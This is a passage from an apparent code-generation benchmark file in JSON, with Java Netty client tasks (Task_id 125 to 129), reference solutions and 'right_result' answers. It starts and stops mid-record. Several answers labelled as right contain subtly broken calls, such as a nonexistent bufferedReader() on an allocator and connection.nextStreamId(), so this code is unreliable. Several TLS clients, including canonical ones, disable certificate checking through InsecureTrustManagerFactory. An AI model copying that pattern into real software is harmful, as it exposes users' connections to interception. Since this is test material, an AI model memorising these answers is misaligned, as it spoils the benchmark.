io.netty.handler.codec.http.websocketx.TextWebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.timeout.IdleStateHandler;\n\npublic class NettyWebSocket implements ITransport {\n\n    private Channel mChannel;\n    private NettyWebSocketClientHandler mHandler;\n    private NioEventLoopGroup mGroup;\n    private final String mUri;\n    private WebSocketOptions mOptions;\n\n    public NettyWebSocket(String uri, WebSocketOptions options) {\n        mUri = uri;\n        mOptions = options != null ? options : new WebSocketOptions();\n    }\n\n    @Override\n    public void connect(ITransportHandler transportHandler, TransportOptions options) throws Exception {\n        if (options == null) {\n            options = new TransportOptions();\n            options.setAutoPingInterval(mOptions.getAutoPingInterval());\n            options.setAutoPingTimeout(mOptions.getAutoPingTimeout());\n            options.setMaxFramePayloadSize(mOptions.getMaxFramePayloadSize());\n        }\n\n        URI uri = new URI(mUri);\n        int port = validateURIAndGetPort(uri);\n        String scheme = uri.getScheme();\n        String host = uri.getHost();\n\n        final SslContext sslContext = getSSLContext(scheme);\n\n        WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(\n                uri, WebSocketVersion.V13, null, true,\n                new DefaultHttpHeaders(), options.getMaxFramePayloadSize());\n        mHandler = new NettyWebSocketClientHandler(handshaker, this, transportHandler);\n\n        mGroup = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(mGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        if (sslContext != null) {\n                            pipeline.addLast(sslContext.newHandler(ch.alloc(), host, port));\n                        }\n                        pipeline.addLast(\n                                new HttpClientCodec(),\n                                new HttpObjectAggregator(8192),\n                                new IdleStateHandler(\n                                        options.getAutoPingInterval() + options.getAutoPingTimeout(),\n                                        options.getAutoPingInterval(), 0, TimeUnit.SECONDS),\n                                mHandler);\n                    }\n                });\n\n        ChannelFuture f = bootstrap.connect(uri.getHost(), port);\n        f.addListener((ChannelFutureListener) connectFuture -> {\n            if (connectFuture.cause() != null) {\n                transportHandler.onDisconnect(false);\n            } else {\n                mChannel = f.channel();\n            }\n        });\n    }\n\n    @Override\n    public void send(byte[] payload, boolean isBinary) {\n        WebSocketFrame frame = isBinary ?\n                new BinaryWebSocketFrame(toByteBuf(payload)) :\n                new TextWebSocketFrame(toByteBuf(payload));\n        mChannel.writeAndFlush(frame);\n    }\n\n    @Override\n    public boolean isOpen() {\n        return mChannel != null && mChannel.isOpen();\n    }\n\n    @Override\n    public void close() throws Exception {\n        if (mHandler != null && mChannel != null) {\n            mHandler.close(mChannel, true, new CloseDetails(CloseDetails.REASON_DEFAULT, null));\n        }\n        if (mGroup != null) {\n            mGroup.shutdownGracefully().sync();\n            mGroup = null;\n        }\n    }\n\n    private int validateURIAndGetPort(URI uri) {\n        String scheme = uri.getScheme();\n        if (!\"ws\".equalsIgnoreCase(scheme) && !\"wss\".equalsIgnoreCase(scheme)) {\n            throw new IllegalArgumentException(\"Only WS(S) is supported.\");\n        }\n        int port = uri.getPort();\n        if (port == -1) {\n            port = \"ws\".equalsIgnoreCase(scheme) ? 80 : 443;\n        }\n        return port;\n    }\n\n    private SslContext getSSLContext(String scheme) throws SSLException {\n        return \"wss\".equalsIgnoreCase(scheme) ?\n                SslContextBuilder.forClient().trustManager(InsecureTrustManagerFactory.INSTANCE).build() :\n                null;\n    }\n\n    private ByteBuf toByteBuf(byte[] bytes) {\n        return Unpooled.copiedBuffer(bytes);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.*;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.net.URI;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\n\npublic class NettyWebSocket implements ITransport {\n    private Channel mChannel;\n    private NettyWebSocketClientHandler mHandler;\n    private NioEventLoopGroup mGroup;\n    private String mUri;\n    private WebSocketOptions mOptions;\n\n    public void connect(ITransportHandler transportHandler, TransportOptions options) throws Exception {\n        URI uri = new URI(mUri);\n        mOptions = (WebSocketOptions) options;\n        mGroup = new NioEventLoopGroup();\n\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(mGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        SslContext sslCtx = getSSLContext(uri.getScheme());\n                        if (sslCtx != null) {\n                            pipeline.addLast(sslCtx.newHandler(ch.alloc(), uri.getHost(), validateURIAndGetPort(uri)));\n                        }\n\n                        pipeline.addLast(new HttpClientCodec());\n                        pipeline.addLast(new HttpObjectAggregator(8192));\n                        pipeline.addLast(new WebSocketClientHandler(\n                                new WebSocketClientHandshakerFactory().newHandshaker(\n                                        uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders())));\n                        mHandler = new NettyWebSocketClientHandler(transportHandler);\n                        pipeline.addLast(mHandler);\n                    }\n                });\n\n        mChannel = bootstrap.connect(uri.getHost(), validateURIAndGetPort(uri)).sync().channel();\n        mHandler.setChannelFuture(mChannel.closeFuture());\n    }\n\n    public void send(byte[] payload, boolean isBinary) {\n        if (!mChannel.isActive()) return;\n\n        ByteBuf byteBuf = toByteBuf(payload);\n        if (isBinary) {\n            mChannel.writeAndFlush(new BinaryWebSocketFrame(byteBuf));\n        } else {\n            mChannel.writeAndFlush(new TextWebSocketFrame(byteBuf));\n        }\n    }\n\n    public boolean isOpen() {\n        return mChannel != null && mChannel.isOpen();\n    }\n\n    public void close() throws Exception {\n        if (mChannel != null) {\n            mChannel.close().sync();\n        }\n        if (mGroup != null) {\n            mGroup.shutdownGracefully();\n        }\n    }\n\n    private int validateURIAndGetPort(URI uri) {\n        String scheme = uri.getScheme();\n        int defaultPort = \"wss\".equals(scheme) ? 443 : 80;\n        return uri.getPort() == -1 ? defaultPort : uri.getPort();\n    }\n\n    private SslContext getSSLContext(String scheme) throws NoSuchAlgorithmException, KeyManagementException {\n        if (\"wss\".equals(scheme)) {\n            return SslContextBuilder.forClient()\n                    .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                    .build();\n        }\n        return null;\n    }\n\n    private ByteBuf toByteBuf(byte[] bytes) {\n        return Unpooled.wrappedBuffer(bytes);\n    }\n}\n```"
  },
  {
    "Task_id": 125,
    "Instruction": "Task Description: Create a Java class that manages TCP client connections using Netty framework, handling connection establishment, error handling, and resource cleanup.\n\nClass Description: NetService is a connection management class that maintains and reuses TCP connections to remote locations using Netty's non-blocking I/O. It provides thread-safe connection pooling and handles connection lifecycle including handshake, authentication, and graceful shutdown.\n\nAttributes:\n- connections: ConcurrentHashMap<Location, Connection> - Thread-safe map storing active connections keyed by remote location\n\nMethods:\n- connect(Location location) -> Connection - Establishes or reuses a TCP connection to the specified location. Handles connection initialization, handshake, and authentication. Returns the established connection.\n  Input: \n    - location: Location - The remote endpoint to connect to\n  Output: \n    - Connection - The established or existing connection object\n\nThe implementation should:\n1. Use Netty's Bootstrap for client configuration\n2. Employ NioEventLoopGroup for I/O thread management\n3. Configure TCP_NODELAY for low-latency communication\n4. Handle connection errors and interruptions\n5. Implement connection pooling with automatic cleanup\n6. Support connection handshake and authentication\n7. Provide graceful shutdown of resources\n8. Maintain thread safety through ConcurrentHashMap",
    "Canonical_solution": "import io.dingodb.common.Location;\nimport io.dingodb.net.NetError;\nimport io.dingodb.net.netty.Constant;\nimport io.dingodb.net.netty.connection.Connection;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\nimport static io.dingodb.common.concurrent.Executors.executor;\nimport static io.dingodb.common.util.Optional.ifPresent;\n\n@Slf4j\npublic class NetService {\n\n    private final Map<Location, Connection> connections = new ConcurrentHashMap<>(8);\n\n    private Connection connect(Location location) {\n        return connections.computeIfAbsent(location, k -> {\n            Optional<Connection> connection = Optional.empty();\n            NioEventLoopGroup executor = new NioEventLoopGroup(0, executor(location.url() + \"/connection\"));\n            try {\n                Bootstrap bootstrap = new Bootstrap();\n                bootstrap\n                    .channel(NioSocketChannel.class)\n                    .group(executor)\n                    .option(ChannelOption.TCP_NODELAY, true)\n                    .remoteAddress(location.toSocketAddress())\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            connection.ifAbsentSet(new Connection(Constant.CLIENT, location, ch));\n                            NettyHandlers.initChannelPipeline(ch, connection.get());\n                        }\n                    });\n                bootstrap.connect().sync().await();\n                connection\n                    .ifPresent(Connection::handshake).ifPresent(Connection::auth)\n                    .ifPresent(() -> log.info(\"Connection open, remote: [{}].\", location))\n                    .orElseThrow(() -> new NullPointerException(\"connection\"));\n            } catch (InterruptedException e) {\n                log.error(\"Open connection to [{}] interrupted.\", location, e);\n                connection.ifPresent(Connection::close);\n                executor.shutdownGracefully();\n                NetError.OPEN_CONNECTION_INTERRUPT.throwFormatError(location);\n            } catch (Exception e) {\n                log.error(\"Open connection to [{}] error.\", location, e);\n                connection.ifPresent(Connection::close);\n                executor.shutdownGracefully();\n                throw e;\n            }\n            connection.get().addCloseListener(__ -> executor.shutdownGracefully());\n            connection.ifPresent(__ -> __.addCloseListener(___ -> connections.remove(location, __)));\n            connection.ifPresent(__ -> __.socket().closeFuture().addListener(ignore -> __.close()));\n            return connection.get();\n        });\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class NetService {\n    private final ConcurrentHashMap<Location, Connection> connections = new ConcurrentHashMap<>();\n    private final NioEventLoopGroup group = new NioEventLoopGroup();\n\n    public Connection connect(Location location) {\n        return connections.computeIfAbsent(location, loc -> {\n            try {\n                Bootstrap bootstrap = new Bootstrap();\n                bootstrap.group(group)\n                        .channel(NioSocketChannel.class)\n                        .option(ChannelOption.SO_KEEPALIVE, true)\n                        .option(ChannelOption.TCP_NODELAY, true)\n                        .handler(new ChannelInitializer<SocketChannel>() {\n                            @Override\n                            protected void initChannel(SocketChannel ch) {\n                                ChannelPipeline pipeline = ch.pipeline();\n                                // Add custom handlers for handshake and authentication\n                                pipeline.addLast(\"handshake\", new HandshakeHandler());\n                                pipeline.addLast(\"auth\", new AuthenticationHandler());\n                                pipeline.addLast(\"business\", new BusinessHandler());\n                            }\n                        });\n\n                ChannelFuture future = bootstrap.connect(new InetSocketAddress(loc.getHost(), loc.getPort())).sync();\n                Channel channel = future.channel();\n\n                channel.closeFuture().addListener((ChannelFutureListener) f -> {\n                    connections.remove(loc);\n                    if (f.cause() != null) {\n                        f.cause().printStackTrace();\n                    }\n                });\n\n                return new Connection(channel);\n\n            } catch (Exception e) {\n                throw new RuntimeException(\"Failed to connect to \" + loc, e);\n            }\n        });\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n        connections.clear();\n    }\n\n    public static class Location {\n        private final String host;\n        private final int port;\n\n        public Location(String host, int port) {\n            this.host = host;\n            this.port = port;\n        }\n\n        public String getHost() {\n            return host;\n        }\n\n        public int getPort() {\n            return port;\n        }\n\n        @Override\n        public boolean equals(Object o) {\n            if (this == o) return true;\n            if (!(o instanceof Location)) return false;\n            Location location = (Location) o;\n            return port == location.port && host.equals(location.host);\n        }\n\n        @Override\n        public int hashCode() {\n            return 31 * host.hashCode() + port;\n        }\n    }\n\n    public static class Connection {\n        private final Channel channel;\n\n        public Connection(Channel channel) {\n            this.channel = channel;\n        }\n\n        public boolean isActive() {\n            return channel.isActive();\n        }\n\n        public void writeAndFlush(Object message) {\n            channel.writeAndFlush(message);\n        }\n\n        public void close() {\n            channel.close();\n        }\n    }\n\n    public static class HandshakeHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            System.out.println(\"Handshake initiated\");\n            super.channelActive(ctx);\n        }\n    }\n\n    public static class AuthenticationHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            System.out.println(\"Authentication in progress\");\n            super.channelRead(ctx, msg);\n        }\n    }\n\n    public static class BusinessHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            System.out.println(\"Processing business data\");\n            super.channelRead(ctx, msg);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 126,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a server, send requests, and receive responses, with optional SSL support.\n\nClass Description: FactorialClient is a Netty-based TCP client that connects to a server to calculate factorials. It handles SSL configuration, connection management, and graceful shutdown of resources.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the server to connect to (default: \"127.0.0.1\")\n- PORT: int - The port number of the server (default: 8322)\n- COUNT: int - The number for which factorial should be calculated (default: 1000)\n\nMethods:\n- start(): void - Initializes and starts the Netty client. Configures SSL if enabled, establishes connection to server, and handles the factorial calculation request. Throws Exception if any error occurs during the process.\n  - Input: None\n  - Output: None (prints result to System.err)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class FactorialClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n    static final int COUNT = Integer.parseInt(System.getProperty(\"count\", \"1000\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new FactorialClientInitializer(sslCtx));\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n\n            FactorialClientHandler handler =\n                (FactorialClientHandler) f.channel().pipeline().last();\n\n            System.err.format(\"Factorial of %,d is: %,d\", COUNT, handler.getFactorial());\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class FactorialClient {\n    private final boolean SSL;\n    private final String HOST = \"127.0.0.1\";\n    private final int PORT = 8322;\n    private final int COUNT = 1000;\n\n    public FactorialClient(boolean ssl) {\n        this.SSL = ssl;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .option(ChannelOption.SO_KEEPALIVE, true);\n\n            if (SSL) {\n                SslContext sslCtx = SslContextBuilder.forClient()\n                        .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n                b.handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(sslCtx.newHandler(ch.alloc(), HOST, PORT));\n                        ch.pipeline().addLast(new StringEncoder());\n                    }\n                });\n            } else {\n                b.handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new StringEncoder());\n                    }\n                });\n            }\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            Channel channel = f.channel();\n            channel.writeAndFlush(Unpooled.copiedBuffer(String.valueOf(COUNT), \"UTF-8\"));\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(channel.closeFuture().channel().alloc().bufferedReader()));\n            System.err.println(\"Factorial of \" + COUNT + \" is: \" + reader.readLine());\n\n            channel.closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 127,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for establishing non-blocking network connections to a remote server.\n\nClass Description: The NettyTcpClient class provides functionality to create and manage TCP client connections using Netty's asynchronous event-driven network framework. It handles connection establishment, pipeline configuration, and resource cleanup.\n\nAttributes:\n- eventLoopGroup: [NioEventLoopGroup] - Manages the event processing threads for the client\n- bootstrap: [Bootstrap] - The main configuration object for the Netty client\n\nMethods:\n- NettyTcpClient(): [Constructor] -> [void] - Initializes the client with a new NioEventLoopGroup and Bootstrap instance\n- configureBootstrap(): [void]() -> [void] - Configures the bootstrap with channel type and event loop group\n- connect(int port, String host, Consumer<Connection> handler): [ChannelFuture](int, String, Consumer<Connection>) -> [ChannelFuture] - Establishes a connection to the specified host and port, allowing for pipeline configuration via the handler\n- shutdown(): [void]() -> [void] - Shuts down the event loop group gracefully to release resources\n\nNested Class:\n- Connection: [static class] - Represents an established connection with channel and HTTP/2 components\n  Attributes:\n    - channel: [Channel] - The network channel\n    - context: [ChannelHandlerContext] - The handler context\n    - connection: [Http2Connection] - HTTP/2 connection object\n    - encoder: [Http2ConnectionEncoder] - HTTP/2 encoder\n    - decoder: [Http2ConnectionDecoder] - HTTP/2 decoder\n  Methods:\n    - Connection(ChannelHandlerContext, Http2Connection, Http2ConnectionEncoder, Http2ConnectionDecoder): [Constructor] -> [void] - Creates a new connection instance\n    - nextStreamId(): [int]() -> [int] - Gets the next available stream ID for HTTP/2 communication",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.function.Consumer;\n\npublic class NettyTcpClient {\n\n    private final NioEventLoopGroup eventLoopGroup;\n    private final Bootstrap bootstrap;\n\n    public NettyTcpClient() {\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        configureBootstrap();\n    }\n\n    private void configureBootstrap() {\n        bootstrap.channel(NioSocketChannel.class)\n                .group(eventLoopGroup);\n    }\n\n    public ChannelFuture connect(int port, String host, Consumer<Connection> handler) {\n        bootstrap.handler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n                // Configure client pipeline here\n                // Add encoders, decoders and custom handlers\n            }\n        });\n        return bootstrap.connect(new InetSocketAddress(host, port));\n    }\n\n    public void shutdown() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    public static class Connection {\n        public final Channel channel;\n        public final ChannelHandlerContext context;\n        public final Http2Connection connection;\n        public final Http2ConnectionEncoder encoder;\n        public final Http2ConnectionDecoder decoder;\n\n        public Connection(ChannelHandlerContext context, Http2Connection connection, \n                         Http2ConnectionEncoder encoder, Http2ConnectionDecoder decoder) {\n            this.channel = context.channel();\n            this.context = context;\n            this.connection = connection;\n            this.encoder = encoder;\n            this.decoder = decoder;\n        }\n\n        public int nextStreamId() {\n            return connection.local().incrementAndGetNextStreamId();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.codec.http2.*;\n\nimport javax.net.ssl.SSLException;\nimport java.util.function.Consumer;\n\npublic class NettyTcpClient {\n    private final NioEventLoopGroup eventLoopGroup = new NioEventLoopGroup();\n    private final Bootstrap bootstrap = new Bootstrap();\n\n    public NettyTcpClient() {\n        configureBootstrap();\n    }\n\n    private void configureBootstrap() {\n        bootstrap.group(eventLoopGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .handler(new ChannelInitializer<>() {\n                    @Override\n                    protected void initChannel(Channel ch) throws Exception {\n                        SslContext sslCtx = SslContextBuilder.forClient()\n                                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(sslCtx.newHandler(ch.alloc(), \"localhost\", 443));\n                        pipeline.addLast(new Http2ClientHandler());\n                    }\n                });\n    }\n\n    public ChannelFuture connect(int port, String host, Consumer<Connection> handler) {\n        return bootstrap.connect(host, port).addListener((ChannelFutureListener) future -> {\n            if (future.isSuccess()) {\n                Channel channel = future.channel();\n                ChannelHandlerContext ctx = channel.pipeline().lastContext();\n                try {\n                    Http2Connection connection = DefaultHttp2Connection.newBuilder().build();\n                    Http2ConnectionEncoder encoder = new DefaultHttp2ConnectionEncoder(connection, null);\n                    Http2ConnectionDecoder decoder = new DefaultHttp2ConnectionDecoder(connection, encoder, null);\n                    handler.accept(new Connection(ctx, connection, encoder, decoder));\n                } catch (SSLException e) {\n                    e.printStackTrace();\n                }\n            } else {\n                future.cause().printStackTrace();\n            }\n        });\n    }\n\n    public void shutdown() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    public static class Connection {\n        private final Channel channel;\n        private final ChannelHandlerContext context;\n        private final Http2Connection connection;\n        private final Http2ConnectionEncoder encoder;\n        private final Http2ConnectionDecoder decoder;\n\n        public Connection(ChannelHandlerContext context, Http2Connection connection,\n                          Http2ConnectionEncoder encoder, Http2ConnectionDecoder decoder) {\n            this.context = context;\n            this.channel = context.channel();\n            this.connection = connection;\n            this.encoder = encoder;\n            this.decoder = decoder;\n        }\n\n        public int nextStreamId() {\n            return connection.nextStreamId();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 128,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish non-blocking connections to a remote server, handle message processing through a configurable pipeline, and ensure proper resource cleanup.\n\nClass Description: The MocoClient class provides a reusable TCP client implementation using Netty's non-blocking I/O capabilities. It manages connection lifecycle, channel configuration, and graceful shutdown of network resources.\n\nAttributes:\n- None (This is a stateless client implementation where all configuration is passed through method parameters)\n\nMethods:\n- run(String host, int port, ChannelHandler pipelineFactory) -> void - Main method that initializes and runs the Netty client. It takes the server host address, port number, and a pipeline factory for configuring message handlers. The method establishes the connection, waits for it to close, and ensures proper resource cleanup. Throws MocoException if interrupted during operation.\n\nThe method performs these key operations:\n1. Creates NioEventLoopGroup for I/O thread management\n2. Configures Bootstrap with NioSocketChannel and connection parameters\n3. Sets TCP_NODELAY option for low-latency communication\n4. Applies the provided pipeline factory for message handling\n5. Establishes connection and waits for channel closure\n6. Implements graceful shutdown in finally block",
    "Canonical_solution": "import com.github.dreamhead.moco.MocoException;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class MocoClient {\n    public final void run(final String host, final int port, final ChannelHandler pipelineFactory) {\n        EventLoopGroup group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(host, port)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(pipelineFactory);\n\n        try {\n            Channel channel = bootstrap.connect().sync().channel();\n            ChannelFuture future = channel.closeFuture().sync();\n            future.addListener(ChannelFutureListener.CLOSE);\n        } catch (InterruptedException e) {\n            throw new MocoException(e);\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "```java\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class MocoClient {\n\n    public void run(String host, int port, ChannelHandler pipelineFactory) throws MocoException {\n        EventLoopGroup group = new NioEventLoopGroup();\n\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .option(ChannelOption.SO_KEEPALIVE, true)\n                     .option(ChannelOption.TCP_NODELAY, true)\n                     .handler(new ChannelInitializer<>() {\n                         @Override\n                         protected void initChannel(Channel ch) {\n                             ch.pipeline().addLast(pipelineFactory);\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.connect(new InetSocketAddress(host, port)).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new MocoException(\"Interrupted during client operation\", e);\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    public static class MocoException extends Exception {\n        public MocoException(String message, Throwable cause) {\n            super(message, cause);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 129,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish non-blocking connections, send messages to a server, and handle graceful shutdown.\n\nClass Description: The EchoClient class provides functionality to connect to a TCP server, send messages, and manage client resources. It uses Netty's non-blocking I/O for efficient communication.\n\nAttributes:\n- hostName: [String] - The hostname or IP address of the server to connect to\n- portNumber: [int] - The port number of the server to connect to\n- group: [EventLoopGroup] - Netty event loop group for managing I/O threads\n- channel: [Channel] - The active network channel for communication with the server\n\nMethods:\n- connect(): [void] - Establishes a connection to the specified server using Netty's Bootstrap. Initializes the event loop group and configures the client pipeline.\n- sendMessage(message: [String]): [void] - Converts the input string to a ByteBuf and sends it to the connected server through the active channel.\n- startConsoleInput(): [void] - Reads input from the console and sends it to the server line by line until terminated. Handles IO exceptions.\n- shutdown(): [void] - Gracefully shuts down the event loop group and releases all resources. Should be called when the client is no longer needed.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\n\npublic final class EchoClient {\n\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.TCP_NODELAY, true)\n         .handler(new EchoClientHandler());\n\n        ChannelFuture f = b.connect(hostName, portNumber).sync();\n        channel = f.channel();\n    }\n\n    public void sendMessage(String message) {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        